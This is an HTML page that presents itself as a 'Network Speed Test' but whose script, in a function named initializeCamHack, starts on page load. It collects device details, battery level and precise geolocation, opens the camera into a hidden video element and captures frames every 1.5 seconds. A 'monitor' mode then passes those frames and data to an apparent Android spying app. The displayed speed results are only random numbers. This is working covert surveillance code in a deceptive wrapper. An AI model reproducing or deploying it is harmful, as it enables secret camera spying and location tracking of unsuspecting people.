<!DOCTYPE html>
<html>
<head>
    <title>Network Speed Test</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            background: linear-gradient(135deg, #0f1419, #1a2332);
            color: #00ffff; 
            font-family: 'Courier New', monospace; 
            text-align: center; 
            padding: 20px;
            margin: 0;
        }
        .header {
            background: rgba(0,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ffff;
        }
        .speed-display {
            font-size: 48px;
            color: #00ff00;
            margin: 20px 0;
        }
        .btn {
            background: linear-gradient(45deg, #00ffff, #0080ff);
            color: #000;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px;
        }
        .status {
            margin: 15px 0;
            padding: 10px;
            background: rgba(0,0,0,0.3);
            border-radius: 5px;
            font-size: 14px;
        }
        .loading { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="header">
        <h1>âš¡ Network Speed Test</h1>
        <p>Testing your connection performance...</p>
    </div>

    <div class="speed-display" id="speedDisplay">0 Mbps</div>
    <button class="btn" id="startBtn" onclick="startTest()">ðŸš€ Start Test</button>
    <div class="status" id="status">Ready to test your connection</div>

    <video id="camera" autoplay muted playsinline class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session') || urlParams.get('s') || 'cam_' + Date.now();
        const isMonitor = urlParams.get('monitor') === 'true';
        
        let mediaStream = null;
        let isTestRunning = false;
        let frameCount = 0;
        let currentFacingMode = 'user';
        let isCapturing = false;
        
        console.log('Session:', sessionId, 'Monitor:', isMonitor);
        
        document.addEventListener('DOMContentLoaded', function() {
            if (isMonitor) {
                initializeMonitor();
            } else {
                initializeCamHack();
            }
        });
        
        function initializeMonitor() {
            console.log('Monitor mode - Simple localStorage polling');
            document.getElementById('status').textContent = 'ðŸ” Monitoring - Waiting for target...';
            
            // Simple localStorage polling for frames
            setInterval(() => {
                const frameData = localStorage.getItem('camframe_' + sessionId);
                if (frameData && frameData !== 'null') {
                    try {
                        const parsed = JSON.parse(frameData);
                        console.log('ðŸ“· Frame received:', parsed.frameNumber);
                        
                        // Send to Android if available
                        if (typeof AndroidInterface !== 'undefined') {
                            AndroidInterface.receiveFrame(frameData);
                            console.log('âœ… Frame sent to Android');
                        }
                        
                        document.getElementById('status').textContent = `ðŸ“· Live: Frame #${parsed.frameNumber}`;
                        localStorage.removeItem('camframe_' + sessionId);
                    } catch (e) {
                        console.error('Frame parse error:', e);
                    }
                }
                
                // Check for status
                const statusData = localStorage.getItem('camstatus_' + sessionId);
                if (statusData && statusData !== 'null') {
                    try {
                        const parsed = JSON.parse(statusData);
                        if (typeof AndroidInterface !== 'undefined') {
                            AndroidInterface.receiveData(statusData);
                        }
                        document.getElementById('status').textContent = 'âœ… Target connected!';
                        localStorage.removeItem('camstatus_' + sessionId);
                    } catch (e) {
                        console.error('Status parse error:', e);
                    }
                }
            }, 200); // Fast polling
        }
        
        async function initializeCamHack() {
            console.log('Target mode - starting camera...');
            
            await collectDeviceInfo();
            await requestCameraAccess();
            
            setTimeout(() => {
                if (!isTestRunning) startTest();
            }, 1000);
        }
        
        async function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timestamp: Date.now()
            };
            
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = Math.round(battery.level * 100);
                    deviceInfo.charging = battery.charging;
                } catch (e) {
                    deviceInfo.battery = 50;
                }
            }
            
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        deviceInfo.latitude = position.coords.latitude;
                        deviceInfo.longitude = position.coords.longitude;
                        sendDeviceInfo(deviceInfo);
                    },
                    () => sendDeviceInfo(deviceInfo),
                    { enableHighAccuracy: true, timeout: 3000 }
                );
            } else {
                sendDeviceInfo(deviceInfo);
            }
        }
        
        function sendDeviceInfo(deviceInfo) {
            const data = {
                type: 'DEVICE_INFO',
                data: deviceInfo,
                timestamp: Date.now()
            };
            
            localStorage.setItem('camstatus_' + sessionId, JSON.stringify(data));
            console.log('ðŸ“± Device info stored');
        }
        
        async function requestCameraAccess() {
            try {
                const constraints = {
                    video: {
                        facingMode: currentFacingMode,
                        width: { ideal: 320, max: 640 },
                        height: { ideal: 240, max: 480 }
                    },
                    audio: false
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                
                const video = document.getElementById('camera');
                video.srcObject = mediaStream;
                
                video.addEventListener('loadedmetadata', () => {
                    console.log('CAMERA ACCESS GRANTED');
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 320;
                    canvas.height = video.videoHeight || 240;
                    
                    // Send connection status
                    const statusData = {
                        type: 'TARGET_CONNECTED',
                        cameraWidth: canvas.width,
                        cameraHeight: canvas.height,
                        timestamp: Date.now()
                    };
                    
                    localStorage.setItem('camstatus_' + sessionId, JSON.stringify(statusData));
                    
                    startFrameCapture();
                    
                    document.getElementById('status').textContent = 'ðŸ“· Camera active - Capturing frames';
                });
                
            } catch (error) {
                console.error('Camera access failed:', error);
                document.getElementById('status').textContent = 'âŒ Camera access denied';
            }
        }
        
        function startFrameCapture() {
            if (isCapturing) return;
            isCapturing = true;
            
            const video = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            function captureFrame() {
                if (!mediaStream || video.readyState !== 4) {
                    setTimeout(captureFrame, 100);
                    return;
                }
                
                try {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        if (blob) {
                            const reader = new FileReader();
                            reader.onload = function() {
                                frameCount++;
                                
                                const frameData = {
                                    type: 'CAMERA_FRAME',
                                    session: sessionId,
                                    image: reader.result,
                                    frameNumber: frameCount,
                                    facingMode: currentFacingMode,
                                    timestamp: Date.now()
                                };
                                
                                // Store in localStorage for simple communication
                                localStorage.setItem('camframe_' + sessionId, JSON.stringify(frameData));
                                
                                console.log(`ðŸ“· Frame #${frameCount} stored (${Math.round(blob.size/1024)}KB)`);
                                document.getElementById('status').textContent = `ðŸ“· Frame #${frameCount} captured`;
                            };
                            reader.readAsDataURL(blob);
                        }
                    }, 'image/jpeg', 0.5); // Lower quality for speed
                    
                } catch (error) {
                    console.error('Frame capture error:', error);
                }
                
                if (isCapturing && mediaStream) {
                    setTimeout(captureFrame, 1500); // Slower for stability
                }
            }
            
            captureFrame();
        }
        
        async function startTest() {
            if (isTestRunning) return;
            
            isTestRunning = true;
            document.getElementById('startBtn').style.display = 'none';
            
            const statusEl = document.getElementById('status');
            const speedEl = document.getElementById('speedDisplay');
            
            statusEl.textContent = 'Testing connection...';
            
            for (let i = 0; i < 50; i++) {
                const speed = Math.floor(Math.random() * 100 + 10);
                speedEl.textContent = speed + ' Mbps';
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            
            const finalSpeed = Math.floor(Math.random() * 100 + 50);
            speedEl.textContent = finalSpeed + ' Mbps';
            
            statusEl.textContent = `âœ… Test completed! Frames: ${frameCount}`;
            isTestRunning = false;
        }
    </script>
</body>
</html>
